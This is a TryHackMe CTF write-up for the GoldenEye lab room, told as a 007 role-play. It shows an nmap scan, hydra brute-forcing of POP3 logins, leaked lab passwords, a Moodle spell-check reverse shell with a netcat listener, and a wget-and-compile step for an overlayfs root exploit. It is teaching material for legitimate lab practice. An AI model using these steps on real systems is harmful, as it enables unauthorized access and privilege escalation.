---
layout: post
permalink: /posts/thm/goldeneye
title: "THM write-up: GoldenEye"
date: 2020-08-10 20:15
tags: tryhackme CTF recon privilege_escalate reverse_shell overlayfs
description: "Another day, another tryhackme CTF write-up. Today, we are going for an extensive CTF walkthrough, the 007 GoldenEye."
---

![titlecard](/assets/images/THM/2020-08-10-goldeneye/1.png)

[Link: https://tryhackme.com/room/goldeneye](https://tryhackme.com/room/goldeneye)

Another day, another tryhackme CTF write-up. Today, we are going for an extensive CTF walkthrough, the 007 GoldenEye. This challenge is ported from vulhub by user ben. It going to be a long walkthrough, so bear with me. Without further ado, let's start the screening time.

## Scene 1: Intro (Enumeration)

### Part 2: Scanning the ports

![cccp](/assets/images/THM/2020-08-10-goldeneye/2.jpg)

First and foremost, we need to gather the information from the golden eye satellite using Nmap scanner.

```
nmap -p- -A -v <Machine IP>
```

We are able to enumerate 4 open ports on the satellite, specifically Port 25 (SMTP), port 80 (HTTP), Port 55006 (SSL), Port 55007 (POP3).

### Part 3: Inspect the source code

Port 80 seems to be the best place to go around. What is inside the page?

![http](/assets/images/THM/2020-08-10-goldeneye/3.webp)

Is a top-secret huh? Time to infiltrate the source code.

![source code](/assets/images/THM/2020-08-10-goldeneye/4.png)

terminal.js? that is interesting

### Part 4: Who are they

![boris](/assets/images/THM/2020-08-10-goldeneye/5.webp)

Damn, look like Natalya knew my existence and encoded the login pass for Boris. Those Russian are too good with it. I'm going to crack this code.

### Part 5: Crack the code

![boris pass](/assets/images/THM/2020-08-10-goldeneye/6.png)

Yes, we got Boris's login credential.

### Part 6: Infiltration

We are going to use this passcode (boris:InvincibleHack3r) to log in to the satellite server. The location is /sev-home/.

![server](/assets/images/THM/2020-08-10-goldeneye/7.png)

I knew it. The GoldenEye is an orbital weapons project. We need to stop this madness. Before that, we need to locate the pop3 server for more intelligence.

## Scene 2: Stop the GoldenEye (Brute-force)

### Part 1: Locate the pop3

Where is the pop3 server located? Oh yea, it is in the port 55007. Let's [access the pop3 server using telnet](https://mediatemple.net/community/products/dv/204404584/sending-or-viewing-emails-using-telnet).

```
telnet <Machine IP> 55007
```

![pop3 access](/assets/images/THM/2020-08-10-goldeneye/8.png)

We only have Boris' Port 80 login credential with us. Can we use it?

![pop3 error](/assets/images/THM/2020-08-10-goldeneye/9.png)

Shoot, access denied. I guess I have to contact agent hydra to brute-force Boris's login credential.

```
hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt <machine IP> -s 55007 pop3
```

### Part 2: Agent hydra in action

![hydra](/assets/images/THM/2020-08-10-goldeneye/10.png)

I just got the message from agent hydra. It seems that Boris's login pass is no longer a secret. You won't getaway. Mr.Boris.

![pop3 success](/assets/images/THM/2020-08-10-goldeneye/11.png)

Yes! we just login into Boris's mail service.

### Part 3: Boris's message

We are now inside Boris's mailbox. Gonna go through all the mail.

![mail](/assets/images/THM/2020-08-10-goldeneye/12.png)

Huh, 3 messages. What is inside the message?

### Part 4: The intel

![email 1](/assets/images/THM/2020-08-10-goldeneye/13.png)

Message 1 is an admin's advice to Boris. Nothing interesting.

![email 2](/assets/images/THM/2020-08-10-goldeneye/14.png)

Message 2 is about Natalya. We have seen this before.

![email 3](/assets/images/THM/2020-08-10-goldeneye/15.png)

Yes, that's it. We can stop the GoldenEye project using the access code, The code is inside the /root file of the machine and it is not an easy task. Who is xenia? where is the training site? what the final stage? We still need more intel! So far we know Boris, Natalya, Janus, and the unknown admin are behind this project. How about I starts with Natalya first. Guess have to call agent hydra again.

### Part 5: Natalya

```
hydra -l natalya -P /usr/share/set/src/fasttrack/wordlist.txt <machine IP> -s 55007 pop3
```

![hydra natalya](/assets/images/THM/2020-08-10-goldeneye/16.png)

I got a message from agent hydra. Look like Natalya's passcode for the pop3 server is **bird**. Let's see what is Natalya's message.

![email 4](/assets/images/THM/2020-08-10-goldeneye/17.png)

Natalya is the GNO supervisor for training and a student will be assigned. Huh.........nothing I can do here. Let's check the next email.

![xenia password](/assets/images/THM/2020-08-10-goldeneye/18.png)

We got the new student xenia's login credential. The email also mentioned an internal domain called severnaya-station.com/gnocertdir. I guess this xenia's credential is somehow connected to this site.

## Scene 3: GoldenEye operators training ground

### Part 1: Connect to the training ground

To connect with the domain, I need to configure the /etc/hosts file in my intelligent watch.

![training](/assets/images/THM/2020-08-10-goldeneye/19.png)

### Part 2: Visit the training ground

![training stage](/assets/images/THM/2020-08-10-goldeneye/20.webp)

I'm now inside the training ground. Look like they are using Moodle as the core system. Let's login as user Xenia.

### Part 3: Xenia

![xenia message](/assets/images/THM/2020-08-10-goldeneye/21.png)

I'm now inside Xenia's training dashboard. Wait a sec, look like our agent, Dr Doak has a message for Xenia.

### Part 4: Dr Doak

![doak message](/assets/images/THM/2020-08-10-goldeneye/22.png)

Dr.Doak has a mail username called Doak. Guess I have no choice but to call agent hydra again.

### Part 5: Doak's credential

![doak hydra](/assets/images/THM/2020-08-10-goldeneye/23.png)

Agent hydra just alerted me a message. It is Dr.doak's pop3 login credential.

### Part 6, 7 and 8: Dock's message

Login Doak's pop 3 servers, I have the following list of message.

![doak pop3](/assets/images/THM/2020-08-10-goldeneye/24.png)

Only 1 message huh. Let's check it out.

![doak email](/assets/images/THM/2020-08-10-goldeneye/25.png)

Look like Dr.Doak has a message for me. It is a login credential for the training ground. Got it, thanks, Dr.

### Part 9: Dock's secret file

Logging in the training ground with the provided credential by Dr.doak. Then, I look for the secret file.

![inside file](/assets/images/THM/2020-08-10-goldeneye/26.png)

Huh, what is inside the file?

### Part 10: The hidden message

![hidden message](/assets/images/THM/2020-08-10-goldeneye/27.webp)

It is a secret message by Dr.Doak. An admin login credential huh? Also, we have something on the server. (/dir007key/for-007.jpg).

![key](/assets/images/THM/2020-08-10-goldeneye/28.png)

A hidden message inside the image, perhaps? Let's give it a try using 'strings'.

![base64](/assets/images/THM/2020-08-10-goldeneye/29.png)

I got an encoded message inside the image file. Maybe Base64?

![base64 decode](/assets/images/THM/2020-08-10-goldeneye/30.png)

Just got the admin passcode **xWinter1995x!**

###  Part 11: The master

![master page](/assets/images/THM/2020-08-10-goldeneye/31.png)

Boris is the master of the project. I'm gonna get you, Boris!!!

### Part 12: Access GoldenEye mainframe

I have the site privilege now. I need to generate a reverse shell to access the GoldenEye mainframe but there is a ton of setting can be tweak. Huh, which one? After checking all the setting pages, I came across this suspicious Path where I can inject a reverse shell.

![target location](/assets/images/THM/2020-08-10-goldeneye/32.png)

Then, I launch my netcat inside my intelligent watch.

```
netcat -lvnp 4444
```

After that, i going to do a spell check my newly created a blog. Wait, there is a problem. The netcat not going to spawn any shell. What did I do wrong? After getting some technical assistance, I need to change the spell engine from google spell to **PSpellShell**. After that, do the spellcheck again.

![reverse shell](/assets/images/THM/2020-08-10-goldeneye/33.png)

Yes, I got the shell. Time to stop Boris's evil plan.

## Scene 4: Boris's demise (Exploitation)

### Part 1: Prepare the tool

Dr.doak try to deliver the [linuxpricchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) and [LinEnum](https://github.com/rebootuser/LinEnum) tool to me to locate the access code. However, the tool is destroyed on the way of delivering. Guess I have to manually get the code.

### Part 2: Frame version

By checking the frame version, I got the following result.

![uname](/assets/images/THM/2020-08-10-goldeneye/34.png)

### Part 3: Exploit the frame

After that, I got a message from Dr.doak where this machine is vulnerable to [overlayfs](https://www.exploit-db.com/exploits/37292) exploit. First and foremost, I need to create the source file and upload it to the frame. This is the procedure from Dr.doak.

- Step1: Copy the ofs code in the intelligent watch (/var/www/html)
- Step2: Start the apache2 server (service apache2 start)
- Step3: Force the frame to download the code into /tmp directory. (wget http://<Machine IP>/ofs.c)
- Step4: In the frame, compile the code using gcc (gcc ofs.c -o ofs)

![gcc problem](/assets/images/THM/2020-08-10-goldeneye/35.png)

On no, the gcc compiler is not found within the frame and the GoldenEye weapon will be launch in 5 min. What to do? How about cc?

### Part 4: The final countdown

But before that, I need to change this code (gcc)

![gcc change](/assets/images/THM/2020-08-10-goldeneye/36.png)

To this code (CC)

![cc change](/assets/images/THM/2020-08-10-goldeneye/37.png)

After that, repeat the procedure and compile the c code using CC instead. Launch the code and get the root privilege.

![root](/assets/images/THM/2020-08-10-goldeneye/38.png)

### Part 5: Borisssssssssssssssssssssss

The access code is hidden inside the /root directory.

![flag](/assets/images/THM/2020-08-10-goldeneye/39.png)

I submit the access code to the frame and the countdown was stopped. The GoldenEye satellite is now crashing and burning in the sky. But before that, time to settle the score with Boris

![boris dead](/assets/images/THM/2020-08-10-goldeneye/40.gif)

## Conclusion

That's all for the agent 007 role play walkthrough. Hope you enjoy the walkthrough. Until next time :)
